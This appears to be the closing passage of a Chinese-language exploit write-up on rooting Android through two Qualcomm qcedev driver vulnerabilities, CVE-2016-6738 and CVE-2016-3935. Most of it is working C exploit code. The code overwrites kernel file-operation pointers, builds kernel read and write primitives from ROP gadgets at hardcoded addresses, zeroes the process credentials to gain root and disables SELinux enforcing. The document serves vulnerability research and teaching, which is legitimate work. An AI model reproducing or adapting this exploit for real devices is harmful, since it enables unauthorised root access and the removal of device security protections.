@@ -1,0 +1,230 @@
+            int ret;
+            int size;
+            unsigned long dst;
+            struct qcedev_cipher_op_req params;
+            dst = PTMX_MISC + 8 * 9; // patch ptmx_cdev->ops
+            size = sizeof(unsigned long);
+            memset(&params, 0, sizeof(params));
+            cmd = QCEDEV_IOCTL_DEC_REQ;
+            params.entries = 1;
+            params.in_place_op = 1; // bypass access_ok check of creq->vbuf.dst[i].vaddr
+            params.alg = QCEDEV_ALG_DES;
+            params.mode = QCEDEV_DES_MODE_ECB;
+            params.data_len = size;
+            params.vbuf.src[0].len = size;
+            params.vbuf.src[0].vaddr = &src;
+            params.vbuf.dst[0].len = size;
+            params.vbuf.dst[0].vaddr = dst;
+            memcpy(params.enckey,"test", 16);
+            params.encklen = 16;
+            printf("[+] overwrite ptmx_cdev ops\n");
+            ret = ioctl(fd, cmd, &params); // trigger 
+            if(ret == -1) {
+                    printf("[-] Ioctl qcedev fail(%s - %d)\n", strerror(errno), errno);
+                    return -1;
+            }
+            return 0;
+    }
+参数 src 就是 `fake_ptmx_fops` 加密后的值，我们将其地址放入
+`qcedev_cipher_op_req.vbuf.src[0].vaddr` 里，目标地址
+`qcedev_cipher_op_req.vbuf.dst[0].vaddr` 存放 `ptmx_cdev->ops` 的地址，然后调用 ioctl
+触发漏洞，任意地址写漏洞触发后，目标地址 `ptmx_cdev->ops` 的值会被覆盖为 `fake_ptmx_fops`.
+此后，对 ptmx 设备的内核fops函数执行，都会被重定向到用户层伪造的函数，我们通过一些 rop 片段来实现伪函数，就可以被内核直接调用。
+    /*
+     * rop write:
+     * ffffffc000671a58:       b9000041        str     w1, [x2]
+     * ffffffc000671a5c:       d65f03c0        ret
+     */
+    #define ROP_WRITE       0xffffffc000671a58
+比如，我们找到一段 rop 如上，其地址是 `0xffffffc000671a58`， 其指令是 str w1, [x2] ; ret ;
+这段 rop 作为一个函数去执行的话，其效果相当于将第二个参数的值写入第三个参数指向的地址。
+我们用这段 rop 构造一个用户态函数，如下
+    static int kernel_write_32(unsigned long addr, unsigned int val)
+    {
+            unsigned long arg;
+            *(unsigned long*)(fake_ptmx_fops + 9 * 8) = ROP_WRITE;
+            arg = addr;
+            ioctl_syscall(__NR_ioctl, ptmx_fd, val, arg);
+            return 0;
+    }
+9*8 是 ioctl 函数在 `file_operations` 结构体里的偏移，
+`*(unsigned long*)(fake_ptmx_fops + 9 * 8) = ROP_WRITE;`
+的效果就是 ioctl 的函数实现替换成 `ROP_WRITE`, 这样我们调用 ptmx 的 ioctl 函数时，最后真实执行的是
+`ROP_WRITE`, 这就是一个内核任意地址写任意值函数。
+同样的原理，我们封装读任意内核地址的函数。
+有了任意内核地址读写函数之后，我们通过以下方法完成最终提权：
+    static int do_root(void)
+    {
+            int ret; 
+            unsigned long i, cred, addr;
+            unsigned int tmp0;
+            /* search myself */
+            ret = get_task_by_comm(&my_task);
+            if(ret != 0) {
+                    printf("[-] get myself fail!\n");
+                    return -1;
+            }
+            if(!my_task || (my_task < 0xffffffc000000000)) {
+                    printf("invalid task address!");
+                    return -2;
+            }
+            ret = kernel_read(my_task + cred_offset, &cred);
+            if (cred < KERNEL_BASE) return -3;
+            i = 1; 
+            addr = cred + 4 * 4;
+            ret = kernel_read_32(addr, &tmp0);
+            if(tmp0 == 0x43736564 || tmp0 == 0x44656144)
+                    i += 4;
+            addr = cred + (i+0) * 4;
+            ret = kernel_write_32(addr, 0);
+            addr = cred + (i+1) * 4;
+            ret = kernel_write_32(addr, 0);
+    ...     
+            ret = kernel_write_32(addr, 0xffffffff);
+            addr = cred + (i+16) * 4;
+            ret = kernel_write_32(addr, 0xffffffff);
+            /* success! */
+            // disable SELinux
+            kernel_write_32(SELINUX_ENFORCING, 0);
+            return 0;
+    }
+搜索到本进程的 cred 结构体，并使用我们封装的内核读写函数，将其成员的值改为0，这样本进程就变成了 root 进程。
+搜索本进程 `task_struct` 的函数 `get_task_by_comm` 具体实现参考 github 的代码。
+##### CVE-2016-3935 漏洞利用
+这个漏洞的提权方法跟 6738 是一样的，唯一不同的地方是，这是一个堆溢出漏洞，我们只能覆盖堆里边的 fops (cve-2016-6738 我们覆盖的是
+.data 区里的 fops )。
+在我测试的版本里，`k_buf_src` 是从 `kmalloc-4096` 分配出来的，因此，需要找到合适的结构来填充 `kmalloc-4096`
+，经过一些源码搜索，我找到了 `tty_struct` 这个结构
+    include/linux/tty.h
+    struct tty_struct {
+            int     magic;
+            struct kref kref;
+            struct device *dev;
+            struct tty_driver *driver;
+            const struct tty_operations *ops;
+            int index;
+    ...
+    }
+在我做利用的设备里，这个结构是从 kmalloc-4096 堆里分配的，其偏移 24Byte 的地方是一个 `struct tty_operations`
+的指针，我们溢出后重写这个结构体，用一个用户态地址覆盖这个指针。
+    #define TTY_MAGIC               0x5401
+    void trigger(int fd)
+    {
+    #define SIZE 632 // SIZE = sizeof(struct tty_struct)
+            int ret, cmd, i;
+            struct  qcedev_sha_op_req params;
+            int *magic;
+            unsigned long * ttydriver;
+            unsigned long * ttyops;
+            memset(&params, 0, sizeof(params));
+            params.entries = 9;
+            params.data_len = SIZE;
+            params.authklen = 16;
+            params.authkey = &trigger_buf[0];
+            params.alg = QCEDEV_ALG_AES_CMAC;
+    // when tty_struct coming from kmalloc-4096
+            magic =(int *) &trigger_buf[4096];
+            *magic = TTY_MAGIC;
+            ttydriver = (unsigned long*)&trigger_buf[4112];
+            *ttydriver = &trigger_buf[0];
+            ttyops = (unsigned long*)&trigger_buf[4120];
+            *ttyops = fake_ptm_fops;
+            params.data[0].len = 4128;
+            params.data[0].vaddr = &trigger_buf[0];
+            params.data[1].len = 536867423 ;
+            params.data[1].vaddr = NULL;
+            for (i = 2; i < params.entries; i++) {
+                    params.data[i].len = 0x1fffffff;
+                    params.data[i].vaddr = NULL;
+            }
+            cmd = QCEDEV_IOCTL_SHA_UPDATE_REQ;
+            ret = ioctl(fd, cmd, &params);
+            if(ret<0) {
+                    printf("[-] ioctl fail %s\n",strerror(errno));
+                    return;
+            }
+            printf("[+] succ trigger\n");
+    }
+`4128 + 536867423 + 7 * 0x1fffffff = 632`
+溢出的方法如上，我们让 entry 的数目为 9 个，第一个长度为 4128, 第二个为 536867423， 其他7个为0x1fffffff
+这样他们加起来溢出之后的值就是 632， 这个长度刚好是 `struct tty_struct` 的长度，我们用
+`qcedev_sha_op_req.data[0].vaddr[4096]` 这个数据来填充被溢出的 tty_struct 的内容
+主要是填充两个地方，一个是最开头的 tty magic, 另一个就是偏移 24Bype 的 `tty_operations`
+指针，我们将这个指针覆盖为伪指针 `fake_ptm_fops`.
+之后的提权操作与 cve-2016-6738 类似，
+    include/linux/tty_driver.h
+    struct tty_operations {
+            struct tty_struct * (*lookup)(struct tty_driver *driver,
+                            struct inode *inode, int idx);
+            int  (*install)(struct tty_driver *driver, struct tty_struct *tty);
+            void (*remove)(struct tty_driver *driver, struct tty_struct *tty);
+            int  (*open)(struct tty_struct * tty, struct file * filp);
+            void (*close)(struct tty_struct * tty, struct file * filp);
+            void (*shutdown)(struct tty_struct *tty);
+            void (*cleanup)(struct tty_struct *tty);
+            int  (*write)(struct tty_struct * tty,
+                          const unsigned char *buf, int count);
+            int  (*put_char)(struct tty_struct *tty, unsigned char ch);
+            void (*flush_chars)(struct tty_struct *tty);
+            int  (*write_room)(struct tty_struct *tty);
+            int  (*chars_in_buffer)(struct tty_struct *tty);
+            int  (*ioctl)(struct tty_struct *tty,
+                        unsigned int cmd, unsigned long arg);
+            long (*compat_ioctl)(struct tty_struct *tty,
+                                 unsigned int cmd, unsigned long arg);
+    ...
+    }
+如上，ioctl 函数在 `tty_operations` 结构体里偏移 12 个指针，当我们用 `ROP_WRITE`
+覆盖这个位置时，可以得到一个内核地址写函数。
+    #define ioctl_syscall(n, efd, cmd, arg) \
+            eabi_syscall(n, efd, cmd, arg)
+    ENTRY(eabi_syscall)
+            mov     x8, x0
+            mov     x0, x1
+            mov     x1, x2
+            mov     x2, x3
+            mov     x3, x4
+            mov     x4, x5
+            mov     x5, x6
+            svc     #0x0
+            ret
+    END(eabi_syscall)
+    /* 
+     ＊ rop write
+     * ffffffc000671a58:       b9000041        str     w1, [x2]
+     * ffffffc000671a5c:       d65f03c0        ret
+     */
+    #define ROP_WRITE               0xffffffc000671a58
+    static int kernel_write_32(unsigned long addr, unsigned int val)
+    {
+            unsigned long arg;
+            *(unsigned long*)(fake_ptm_fops + 12 * 8) = ROP_WRITE;
+            arg = addr;
+            ioctl_syscall(__NR_ioctl, fake_fd, val, arg);
+            return 0;
+    }
+同理，当我们用 ROP_READ 覆盖这个位置时，可以得到一个内核地址写函数。
+    /*
+     * rop read
+     * ffffffc000300060:       f9405440        ldr     x0, [x2,#168]
+     * ffffffc000300064:       d65f03c0        ret
+     */
+    #define ROP_READ                0xffffffc000300060
+    static int kernel_read_32(unsigned long addr, unsigned int *val)
+    {
+            int ret;
+            unsigned long arg;
+            *(unsigned long*)(fake_ptm_fops + 12 * 8) = ROP_READ;
+            arg = addr - 168;
+            errno = 0;
+            ret = ioctl_syscall(__NR_ioctl, fake_fd, 0xdeadbeef, arg);
+            *val = ret;
+            return 0;
+    }
+最后，用封装好的内核读写函数，修改内核的 cred 等结构体完成提权。
+#### 参考
+[1] [android_run_root_shell](https://github.com/android-rooting-tools/android_run_root_shell)
+[2] [xairy](https://github.com/xairy/linux-kernel-exploitation)
+[3] [New Reliable Android Kernel Root Exploitation
+Techniques](http://powerofcommunity.net/poc2016/x82.pdf)
+* * *
